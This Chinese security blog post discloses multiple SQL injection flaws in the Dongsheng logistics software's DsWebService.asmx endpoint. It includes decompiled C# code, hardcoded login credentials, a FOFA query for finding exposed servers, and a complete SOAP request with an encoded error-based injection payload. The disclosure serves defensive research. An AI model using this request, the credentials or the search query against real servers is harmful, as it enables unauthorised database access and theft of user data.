---
title: "东胜物流软件 DsWebService.asmx 多个SQL注入漏洞"
source: https://mrxn.net/jswz/dongsheng-DsWebService-sqli.html
asset_dir: assets/东胜物流软件-dswebservice.asmx-多个sql注入漏洞
---

# 东胜物流软件 DsWebService.asmx 多个SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/28 13:19
- 961浏览
- [0评论](#comment)
- 41分钟阅读

深入探索

鉴权

Database

database

---

# 漏洞简介

东胜物流[软件](#)是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 DsWebService.asmx 接口GetSeaiBsData、GetSeaeBsDataList、GetSeaeBsData和GetSeaiBsDataList、LoadCustomMainfastStatus、GetSeaiData等方法存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

物流软件安全

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

直接看 GetSeaiBsDataList 相关实现逻辑

```
public string GetSeaiBsDataList(
  string LoginName,
  string LoginPass,
  string Mobile,
  string Mblno,
  int start,
  int limit)
{
  SeaiManifest seaiBsDataList = DsWebServiceDAL.GetSeaiBsDataList(LoginName, LoginPass, Mobile, Mblno, start, limit);
```

跟进GetSeaiBsDataList方法

SQL注入防护

深入探索

安全研究报告

计算机安全

Windows安全工具

```
public static SeaiManifest GetSeaiBsDataList(
  string LoginName,
  string LoginPass,
  string Mobile,
  string Mblno,
  int start,
  int limit)
{
  SeaiManifest seaiBsDataList = new SeaiManifest();
  if (string.op_Inequality(LoginName, "qdtaize") || string.op_Inequality(LoginPass, "EBBE3242-D49E-4398-BBFE-0133CA655EB5"))
  {
    seaiBsDataList.ERROMSG = "账号密码不正确";
    return seaiBsDataList;
  }
  T_ALL_DA tAllDa = new T_ALL_DA();
  string str = "";
  string strSql1 = tAllDa.GetStrSQL("GID", $"SELECT top 1 GID FROM user_action Where ACTIONID='4B19971E-FA7F-4528-89F3-4F740CE3D8D5' AND USERID IN (SELECT USERID FROM user_baseinfo WHERE MOBILE='{Mobile}' ) ");
```

存在硬编码账户密码 qdtaize:EBBE3242-D49E-4398-BBFE-0133CA655EB5

代码安全审计

然后参数Mobile被直接拼接在MOBILE=后，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，朴实无华！

同时另外一个参数Mblno也存在同样的问题

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-001-41c6332ef2d0.webp)](https://image.mrxn.net/f692582f9908461da11283c65ab4fd34.webp)

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-002-9b618325df19.webp)](https://image.mrxn.net/7719d11948eb4f409921a70ade1b1104.webp)

GetSeaiBsData存在同样的问题

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-003-0ac6897fcc6d.webp)](https://image.mrxn.net/f045e47e8a73498c8328ad1a33401cfe.webp)

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-004-212c2f526f74.webp)](https://image.mrxn.net/0d2a7eafe98e41acb072a322f14c28f8.webp)

GetSeaeBsDataList 同样如此！

漏洞预警服务

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-005-23509a040e61.webp)](https://image.mrxn.net/1b42e5e8115f44f49171faa40acf2e09.webp)

GetSeaeBsData亦如此！

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-006-6a46ee1d02c5.webp)](https://image.mrxn.net/89bc1daa96f14a4eba3f51a28a7238dd.webp)

GetSeaiData

```
public string GetSeaiData(string LoginName, string LoginPass, string Mblno, string Pono)
{
  if (string.op_Inequality(LoginName, "qdtaize") || string.op_Inequality(LoginPass, "EBBE3242-D49E-4398-BBFE-0133CA655EB5"))
    return "账号密码不正确";
  if (string.op_Equality(Mblno, "") && string.op_Equality(Pono, ""))
    return "提单号和PO号不能为空";
  if (string.op_Inequality(Mblno, ""))
  {
    MsOpSeaiHead msOpSeaiHead = new MsOpSeaiHead();
    DSWeb.MvcShipping.Models.MsOpSeai.MsOpSeai data = DSWeb.MvcShipping.DAL.MsOpSeaiDAL.MsOpSeaiDAL.GetData($"MBLNO='{Mblno}'");
```

存在硬编码账户密码 qdtaize:EBBE3242-D49E-4398-BBFE-0133CA655EB5

网络安全

然后参数LoginName被直接拼接在MBLNO=后，无任何过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，朴实无华！

LoadCustomMainfastStatus

```
public string LoadCustomMainfastStatus(string Mblno)
{
  return string.op_Equality(Mblno, "") ? "" : DsWebServiceDAL.LoadBillStatus(Mblno);
}
public static string LoadBillStatus(string Mblno)
{
  StringBuilder stringBuilder = new StringBuilder();
  stringBuilder.Append("SELECT CH_ID,MBLNO,CNTRNO,SEALNO,DATESTR,VOYNO,[STATUS],[FILENAME],ISPOSTED,CREATETIME");
  stringBuilder.Append(" FROM op_custom_status ");
  stringBuilder.Append($" Where MBLNO='{Mblno}' and (ISPOSTED=0 or ISPOSTED is null) ");
  stringBuilder.Append(" order by CREATETIME ");
  DataSet dataSet = new DataSet();
  Database database = DatabaseFactory.CreateDatabase();
  ManifestStatus manifestStatus = new ManifestStatus();
```

参数`Mblno`也是被直接拼接在SQL语句中执行造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /Webservice/DsWebService.asmx HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/GetSeaiBsDataList"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
   <soap:Header/>
   <soap:Body>
      <dsw:GetSeaiBsDataList>
         <!--Optional:-->
         <dsw:LoginName>qdtaize</dsw:LoginName>
         <!--Optional:-->
         <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>
         <!--Optional:-->
         <dsw:Mobile>&#x31;&#x27;&#x29;&#x6f;&#x72;&#x20;&#x31;&#x3c;&#x75;&#x73;&#x65;&#x72;&#x2d;&#x2d;</dsw:Mobile>
         <!--Optional:-->
         <dsw:Mblno>1</dsw:Mblno>
         <dsw:start>1</dsw:start>
         <dsw:limit>1</dsw:limit>
      </dsw:GetSeaiBsDataList>
   </soap:Body>
</soap:Envelope>
```

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-007-ff3d1312f730.webp)](https://image.mrxn.net/f374e7275ede4753ae4ab6a081d366de.webp)

通过报错注入在响应里回显数据库版本信息。

数据管理

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
